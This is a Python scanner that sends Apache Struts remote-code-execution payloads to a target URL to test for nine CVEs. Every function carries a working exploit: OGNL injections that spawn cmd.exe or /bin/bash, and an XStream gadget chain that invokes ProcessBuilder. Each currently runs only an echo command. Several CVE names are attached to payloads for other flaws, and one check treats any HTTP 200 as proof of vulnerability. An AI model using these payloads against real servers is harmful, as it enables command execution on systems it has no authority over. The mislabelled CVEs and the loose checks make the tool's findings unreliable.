import requests


# CVE-2020-17530
def check_cve_2020_17530(url):
    # Craft a request with a malicious OGNL expression
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess" \
           "%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D" \
           "%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29" \
           ".%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29" \
           ".clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29%7D%0D%0A"

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        if "ognl.NoSuchPropertyException" in response.text and response.status_code is 200:
            print("[+] Your struts is vulnerable to CVE-2020-17530!")
            return True
        print("[-] Your struts is not vulnerable to CVE-2020-17530!")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

    return False


# CVE-2019-0230
def check_cve_2019_0230(url):
    test_payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(" \
                   "#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(" \
                   "#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(" \
                   "#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(" \
                   "#context.setMemberAccess(#dm)))).(#cmd='echo cve-2019-0230-test').(#iswin=(" \
                   "@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{" \
                   "'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(" \
                   "#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(" \
                   "@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(" \
                   "@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': test_payload
    }

    try:
        response = requests.post(url, headers=headers, timeout=10)
        if "cve-2019-0230-test" in response.text and response.status_code is 200:
            print("[+] Your struts is vulnerable to CVE-2019-0230!")
            return True
        print("[-] Your struts is not vulnerable to CVE-2019-0230!")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

    return False


# CVE-2018-11776
def check_cve_2018_11776(url):
    payload = "${(111+111) == 222}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    try:
        response = requests.get(f"{url}/{payload}/actionChain1.action", headers=headers)
        if "${(111+111) == 222}" in response.text and response.status_code is 200:
            print("[+] Your struts is vulnerable to CVE-2018-11776!")
            return True
        else:
            print("[-] Your struts is not vulnerable to CVE-2018-11776!")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False


# CVE-2017-12611
def check_cve_2017_12611(url):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?(#_memberAccess=#dm):((#container=#context[" \
               "'com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='echo test')."
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    headers = {
        "Content-Type": payload
    }

    try:
        response = requests.post(url, headers=headers, timeout=10)
        if "test" in response.text and response.status_code is 200:
            print("[+] Your struts is vulnerable to CVE-2017-12611!")
            return True
        print("[-] Your struts is not vulnerable to CVE-2017-12611!")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

    return False


# CVE-2017-9791
def check_cve_2017_9791(url):
    payload = """
        <map>
            <entry>
                <jdk.nashorn.internal.objects.NativeString>
                    <flags>0</flags>
                    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                        <dataHandler>
                            <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                                <is class="javax.crypto.CipherInputStream">
                                    <cipher class="javax.crypto.NullCipher">
                                        <initialized>false</initialized>
                                        <opmode>0</opmode>
                                        <serviceIterator class="javax.imageio.spi.FilterIterator">
                                            <iter class="javax.imageio.spi.FilterIterator">
                                                <iter class="java.util.Collections$EmptyIterator"/>
                                                <next/>
                                            </iter>
                                            <filter class="javax.imageio.ImageIO$ContainsFilter">
                                                <method>
                                                    <class>java.lang.ProcessBuilder</class>
                                                    <name>start</name>
                                                    <parameter-types/>
                                                </method>
                                                <name>foo</name>
                                            </filter>
                                            <next/>
                                        </serviceIterator>
                                        <lock/>
                                    </cipher>
                                </is>
                                <consumed>false</consumed>
                            </dataSource>
                            <transferFlavors/>
                        </dataHandler>
                        <dataLen>0</dataLen>
                    </value>
                </jdk.nashorn.internal.objects.NativeString>
                <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
            </entry>
            <entry>
                <jdk.nashorn.internal.objects.NativeString>
                    <flags>0</flags>
                    <value class="string">foo</value>
                </jdk.nashorn.internal.objects.NativeString>
                <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
            </entry>
        </map>
    """

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/xml'
    }

    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print("[+] Your struts is vulnerable to CVE-2017-9791!")
            return True
        print("[-] Your struts is not vulnerable to CVE-2017-9791!")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

    return False


# CVE-2017-5638
def check_cve_2017_5638(url):
    malicious_content_type = "multipart/form-data; boundary=---------------------------735323031399963166993862150"
    payload = "-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; " \
              "name=\"foo\"; filename=\"%{#context[" \
              "'com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test'," \
              "1337*1337)}\"\r\nContent-Type: " \
              "text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n"

    try:
        response = requests.post(url, headers={"Content-Type": malicious_content_type}, data=payload, timeout=10)
        if response.status_code == 200 and "X-Test" in response.headers and int(
                response.headers["X-Test"]) == 1337 * 1337:
            print("[+] Your struts is vulnerable to CVE-2017-5638!")
            return True
        else:
            print("[-] Your struts is not vulnerable to CVE-2017-5638!")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False


# CVE-2016-3092
def check_cve_2016_3092(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/58.0.3029.110 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        payload = '%24%7B(%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime' \
                  '%40getRuntime().exec(%27echo struts_cve_2016_3092_test%27).getInputStream(' \
                  ')%2C%23b%3Dnew+java.io.InputStreamReader(%23a)%2C%23c%3Dnew+java.io.BufferedReader(' \
                  '%23b)%2C%23d%3Dnew+char%5B51020%5D%2C%23c.read(' \
                  '%23d)%2C%23sbtest%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(' \
                  ')%2C%23sbtest.println(%23d)%2C%23sbtest.close())%7D'
        response = requests.post(url, data=payload, headers=headers)

        if 'struts_cve_2016_3092_test' in response.text and response.status_code is 200:
            print("[+] Your struts is vulnerable to CVE-2016-3092!")
            return True
        else:
            print("[-] Your struts is not vulnerable to CVE-2016-3092!")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False


# CVE-2016-3081
def check_cve_2016_3081(url):
    test_url = f"{url}index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," \
               f"%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(" \
               f"%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(" \
               f"@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(" \
               f"%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D," \
               f"%23w.print(%23str),%23w.close()," \
               f"1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=echo+has+vul"
    try:
        response = requests.get(test_url)
        if response.status_code == 200 and 'has vul' in response.text and response.status_code is 200:
            print("[+] Your struts is vulnerable to CVE-2016-3081!")
            return True
        else:
            print("[-] Your struts is not vulnerable to CVE-2016-3081!")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False


# CVE-2014-0094
def check_cve_2014_0094(url):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payload = (
        "%{(#_='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):((#container=#context["
        "'com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        "(#cmd='echo vulnerable')."
        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true))."
        "(#process=#p.start())."
        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        "(#ros.flush())}"
    )

    try:
        response = requests.post(url, headers=headers, data=payload, timeout=10)
        if "vulnerable" in response.text and response.status_code is 200:
            print("[+] Your struts is vulnerable to CVE-2014-0094!")
            return True
        print("[-] Your struts is not vulnerable to CVE-2014-0094!")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")

    return False


cve_vulnerabilities = {
    'CVE-2014-0094': check_cve_2014_0094,
    'CVE-2016-3081': check_cve_2016_3081,
    'CVE-2016-3092': check_cve_2016_3092,
    'CVE-2017-5638': check_cve_2017_5638,
    'CVE-2017-9791': check_cve_2017_9791,
    'CVE-2017-12611': check_cve_2017_12611,
    'CVE-2018-11776': check_cve_2018_11776,
    'CVE-2019-0230': check_cve_2019_0230,
    'CVE-2020-17530': check_cve_2020_17530,
}
